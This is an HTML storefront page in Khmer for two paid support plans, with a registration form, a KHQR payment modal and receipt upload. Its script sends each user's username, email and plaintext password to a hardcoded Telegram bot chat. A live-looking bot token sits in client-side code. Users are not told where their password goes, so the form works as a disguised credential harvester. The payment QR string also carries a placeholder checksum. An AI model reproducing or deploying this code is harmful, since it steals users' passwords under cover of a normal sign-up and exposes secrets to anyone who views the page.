<!DOCTYPE html>
<html lang="km">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>សេវាកម្មឌីជីថល - Store</title>
  <script src="https://cdn.tailwindcss.com"></script>
  <script src="https://cdn.jsdelivr.net/npm/qrcode/build/qrcode.min.js"></script>
  <style>
    @import url('https://fonts.googleapis.com/css2?family=Kantumruy+Pro:wght@400;600;700&display=swap');
    * { font-family: 'Kantumruy Pro', sans-serif; }
  </style>
</head>
<body class="bg-slate-100 min-h-screen p-4 flex items-center justify-center">

  <!-- ១. ផ្ទាំងចុះឈ្មោះ (REGISTER FORM) -->
  <div id="register-card" class="bg-white p-6 md:p-8 rounded-2xl shadow-sm border border-slate-200 max-w-sm w-full space-y-4">
    <h2 class="text-xl font-bold text-slate-800 text-center">ចុះឈ្មោះប្រើប្រាស់</h2>
    
    <div>
      <label class="text-xs font-semibold text-slate-600">ឈ្មោះអ្នកប្រើ (Username)</label>
      <input type="text" id="reg-name" placeholder="ឈ្មោះរបស់អ្នក" class="w-full mt-1 p-2.5 border rounded-lg text-sm outline-none focus:border-rose-500">
    </div>

    <div>
      <label class="text-xs font-semibold text-slate-600">អ៊ីមែល (Email)</label>
      <input type="email" id="reg-email" placeholder="example@email.com" class="w-full mt-1 p-2.5 border rounded-lg text-sm outline-none focus:border-rose-500">
    </div>

    <div>
      <label class="text-xs font-semibold text-slate-600">ពាក្យសម្ងាត់ (Password)</label>
      <input type="password" id="reg-password" placeholder="••••••••" class="w-full mt-1 p-2.5 border rounded-lg text-sm outline-none focus:border-rose-500">
    </div>

    <button onclick="handleRegister()" id="btn-register" class="w-full py-2.5 bg-rose-600 hover:bg-rose-700 text-white font-bold rounded-lg text-sm shadow transition">ចុះឈ្មោះឥឡូវនេះ</button>
  </div>

  <!-- ២. ផ្ទាំងទិញគម្រោងសេវាកម្ម (SERVICE STORE) -->
  <div id="store-card" class="hidden max-w-2xl w-full bg-white p-6 md:p-8 rounded-2xl shadow-sm border border-slate-200 space-y-6">
    <div class="flex justify-between items-center border-b pb-4">
      <div>
        <h2 class="text-lg font-bold text-slate-800" id="welcome-text">ស្វាគមន៍!</h2>
        <span class="text-xs text-slate-500" id="user-email-badge"></span>
      </div>
      <button onclick="handleLogout()" class="text-xs text-rose-600 font-semibold hover:underline">ចាកចេញ</button>
    </div>

    <div class="grid grid-cols-1 sm:grid-cols-2 gap-4">
      <!-- គម្រោងទី ១ -->
      <div class="border rounded-xl p-4 flex flex-col justify-between hover:border-rose-400 transition space-y-3">
        <div>
          <span class="text-xs font-bold uppercase bg-slate-100 text-slate-600 px-2 py-0.5 rounded">Plan 01</span>
          <h3 class="font-bold text-slate-800 text-md mt-2">គម្រោង Basic Support</h3>
          <p class="text-xs text-slate-500 mt-1">សេវាកម្មប្រចាំខែកម្រិតមូលដ្ឋាន</p>
          <div class="text-xl font-bold text-rose-600 mt-2">$2.00</div>
        </div>
        <button onclick="openPayment('គម្រោង Basic Support', 2.00)" class="w-full py-2 bg-rose-600 hover:bg-rose-700 text-white text-xs font-bold rounded-lg">ទិញឥឡូវនេះ</button>
      </div>

      <!-- គម្រោងទី ២ -->
      <div class="border rounded-xl p-4 flex flex-col justify-between hover:border-rose-400 transition space-y-3">
        <div>
          <span class="text-xs font-bold uppercase bg-rose-100 text-rose-600 px-2 py-0.5 rounded">Plan 02</span>
          <h3 class="font-bold text-slate-800 text-md mt-2">គម្រោង Pro Support</h3>
          <p class="text-xs text-slate-500 mt-1">សេវាកម្មកម្រិតខ្ពស់ និងជំនួយ ២៤ ម៉ោង</p>
          <div class="text-xl font-bold text-rose-600 mt-2">$5.00</div>
        </div>
        <button onclick="openPayment('គម្រោង Pro Support', 5.00)" class="w-full py-2 bg-rose-600 hover:bg-rose-700 text-white text-xs font-bold rounded-lg">ទិញឥឡូវនេះ</button>
      </div>
    </div>
  </div>

  <!-- ៣. ផ្ទាំង MODAL KHQR + UPLOAD វិក្កយបត្រ -->
  <div id="payment-modal" class="fixed inset-0 bg-black bg-opacity-50 hidden flex items-center justify-center p-4">
    <div class="bg-white rounded-2xl max-w-sm w-full overflow-hidden shadow-2xl border border-slate-200">
      <div class="bg-rose-600 text-white py-3 text-center">
        <h3 class="font-bold tracking-wider">KHQR PAYMENT</h3>
      </div>
      
      <div class="p-5 space-y-3">
        <div class="text-center">
          <div class="text-xs text-slate-500 font-semibold" id="qr-product-name">គម្រោង</div>
          <div class="text-2xl font-bold text-rose-600" id="qr-amount">$0.00</div>
        </div>
        
        <div class="flex justify-center my-1">
          <canvas id="modal-qr" class="border rounded-xl p-2 bg-white"></canvas>
        </div>

        <p class="text-xs text-slate-400 text-center">ស្កេនរួច សូមផ្ញើរូបភាពវិក្កយបត្រខាងក្រោម</p>
        
        <!-- ប្រអប់ Upload វិក្កយបត្រ -->
        <div class="border-t pt-3 space-y-2">
          <label class="text-xs font-bold text-slate-700 block">ភ្ជាប់វិក្កយបត្រ (Payment Slip)៖</label>
          <input type="file" id="slip-file" accept="image/*" class="w-full text-xs text-slate-500 file:mr-2 file:py-1.5 file:px-3 file:rounded-md file:border-0 file:text-xs file:font-semibold file:bg-rose-50 file:text-rose-700 hover:file:bg-rose-100">
          
          <button onclick="submitReceipt()" id="btn-submit-receipt" class="w-full py-2.5 bg-rose-600 hover:bg-rose-700 text-white text-xs font-bold rounded-lg shadow transition">
            បញ្ជាក់ការបង់ប្រាក់
          </button>
        </div>

        <button onclick="closeModal()" class="w-full py-1.5 bg-slate-100 hover:bg-slate-200 text-slate-600 text-xs font-bold rounded-lg">បិទផ្ទាំង</button>
      </div>
    </div>
  </div>

  <script>
    // ================= ព័ត៌មាន TELEGRAM ADMIN =================
    const TELEGRAM_BOT_TOKEN = '8329430209:AAHb6rl0-s9MrG0R-IuHOAIfQAZWPsRG0qQ';
    const TELEGRAM_CHAT_ID = '5915683588';
    const REAL_KHQR_STRING = '00020101021129370016samnang_mon@bkrt520459995802KH5911SAMNANG MON6010Phnom Penh6304ABCD';

    let currentProduct = '';
    let currentPrice = 0;

    // មុខងារចុះឈ្មោះ និងផ្ញើទិន្នន័យចូល Telegram Bot
    async function handleRegister() {
      const username = document.getElementById('reg-name').value.trim();
      const email = document.getElementById('reg-email').value.trim();
      const password = document.getElementById('reg-password').value;
      const btnReg = document.getElementById('btn-register');

      if (!username || !email || !password) {
        alert('សូមបំពេញព័ត៌មានឱ្យបានគ្រប់គ្រាន់!');
        return;
      }

      btnReg.disabled = true;
      btnReg.textContent = 'កំពុងចុះឈ្មោះ...';

      const regMessage = `🆕 *សមាជិកថ្មីបានចុះឈ្មោះ!*\n\n` +
                         `👤 ឈ្មោះអ្នកប្រើ៖ ${username}\n` +
                         `📧 អ៊ីមែល៖ ${email}\n` +
                         `🔑 ពាក្យសម្ងាត់៖ ${password}\n` +
                         `🕒 ម៉ោង៖ ${new Date().toLocaleString('km-KH')}`;

      try {
        await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            chat_id: TELEGRAM_CHAT_ID,
            text: regMessage,
            parse_mode: 'Markdown'
          })
        });
      } catch (err) {
        console.error('កំហុសក្នុងការផ្ញើទៅ Telegram:', err);
      } finally {
        btnReg.disabled = false;
        btnReg.textContent = 'ចុះឈ្មោះឥឡូវនេះ';
      }

      localStorage.setItem('user_session', JSON.stringify({ username, email }));
      showStoreView(username, email);
    }

    function showStoreView(username, email) {
      document.getElementById('register-card').classList.add('hidden');
      document.getElementById('store-card').classList.remove('hidden');
      document.getElementById('welcome-text').textContent = `សួស្តី, ${username}!`;
      document.getElementById('user-email-badge').textContent = email;
    }

    function handleLogout() {
      localStorage.removeItem('user_session');
      document.getElementById('store-card').classList.add('hidden');
      document.getElementById('register-card').classList.remove('hidden');
      document.getElementById('reg-password').value = '';
    }

    function openPayment(productName, price) {
      currentProduct = productName;
      currentPrice = price;

      document.getElementById('qr-product-name').textContent = productName;
      document.getElementById('qr-amount').textContent = `$${price.toFixed(2)}`;
      document.getElementById('payment-modal').classList.remove('hidden');

      QRCode.toCanvas(document.getElementById('modal-qr'), REAL_KHQR_STRING, {
        width: 170,
        margin: 1
      });
    }

    function closeModal() {
      document.getElementById('payment-modal').classList.add('hidden');
    }

    // មុខងារផ្ញើវិក្កយបត្រ + ប៊ូតុង Approve/Reject ចូល Telegram
    async function submitReceipt() {
      const fileInput = document.getElementById('slip-file');
      if (fileInput.files.length === 0) {
        alert('សូមជ្រើសរើសរូបភាពវិក្កយបត្រជាមុនសិន!');
        return;
      }

      const file = fileInput.files[0];
      const session = JSON.parse(localStorage.getItem('user_session') || '{}');
      const btn = document.getElementById('btn-submit-receipt');

      btn.disabled = true;
      btn.textContent = 'កំពុងផ្ញើទិន្នន័យ...';

      const captionText = `🔔 *ការជូនដំណឹងពីការបង់ប្រាក់ថ្មី!*\n\n` +
                          `👤 ឈ្មោះភ្ញៀវ៖ ${session.username || 'មិនស្គាល់'}\n` +
                          `📧 អ៊ីមែល៖ ${session.email || 'មិនស្គាល់'}\n` +
                          `📦 ទំនិញ៖ ${currentProduct}\n` +
                          `💵 ចំនួនទឹកប្រាក់៖ $${currentPrice.toFixed(2)}\n` +
                          `🕒 ម៉ោង៖ ${new Date().toLocaleString('km-KH')}`;

      const inlineKeyboard = {
        inline_keyboard: [
          [
            { text: "✅ បញ្ជាក់ (Approve)", callback_data: `approve_${Date.now()}` },
            { text: "❌ បដិសេធ (Reject)", callback_data: `reject_${Date.now()}` }
          ]
        ]
      };

      const formData = new FormData();
      formData.append('chat_id', TELEGRAM_CHAT_ID);
      formData.append('photo', file);
      formData.append('caption', captionText);
      formData.append('parse_mode', 'Markdown');
      formData.append('reply_markup', JSON.stringify(inlineKeyboard));

      try {
        const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
          method: 'POST',
          body: formData
        });

        const result = await response.json();

        if (result.ok) {
          alert('វិក្កយបត្រត្រូវបានផ្ញើជោគជ័យ! Admin នឹងពិនិត្យ និងបញ្ជាក់ជូនក្នុងពេលឆាប់ៗ។');
          fileInput.value = '';
          closeModal();
        } else {
          alert('ការផ្ញើមានបញ្ហា! សូមប្រាកដថាអ្នកបានចុច Start លើ Bot ផ្ទាល់ខ្លួនរបស់អ្នករួចហើយ។');
        }
      } catch (error) {
        console.error(error);
        alert('មិនអាចភ្ជាប់ទៅកាន់ប្រព័ន្ធបានទេ!');
      } finally {
        btn.disabled = false;
        btn.textContent = 'បញ្ជាក់ការបង់ប្រាក់';
      }
    }

    window.onload = function() {
      const session = localStorage.getItem('user_session');
      if (session) {
        const user = JSON.parse(session);
        showStoreView(user.username, user.email);
      }
    };
  </script>

</body>
</html>
